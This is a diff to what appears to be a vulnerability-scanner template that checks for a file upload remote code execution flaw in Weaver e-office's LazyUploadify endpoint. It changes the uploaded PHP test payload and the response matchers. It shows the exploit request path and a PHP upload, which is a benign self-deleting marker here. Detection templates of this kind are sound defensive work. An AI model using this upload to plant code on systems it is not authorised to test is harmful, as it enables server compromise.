@@ -15,10 +15,12 @@ http:
   matchers:
   - condition: and
     dsl:
-    - status_code_1 == 200
     - contains(body_2, 'attachmentID') && contains(body_2, 'attachmentName')
-    - status_code_3 == 200 && contains(body_3,'{{randstr}}')
     type: dsl
+  - part: body_3
+    type: word
+    words:
+    - '{{md5(string)}}'
   matchers-condition: and
   raw:
   - 'GET /general/weibo/javascript/LazyUploadify/uploadify.php HTTP/1.1
@@ -47,7 +49,7 @@ http:
     Content-Type: application/octet-stream
 
 
-    <?php echo "{{string}}";unlink(__FILE__);?>
+    <?php echo md5("{{string}}");unlink(__FILE__);?>
 
     ------WebKitFormBoundaryjetvpuye--
 
@@ -72,4 +74,4 @@ info:
   tags: weaver,e-office,intrusive,rce,file-upload
 variables:
   filename: '{{to_lower(rand_base(5))}}'
-  string: '{{randstr}}'
+  string: weaver-lazyuploadify-file-upload
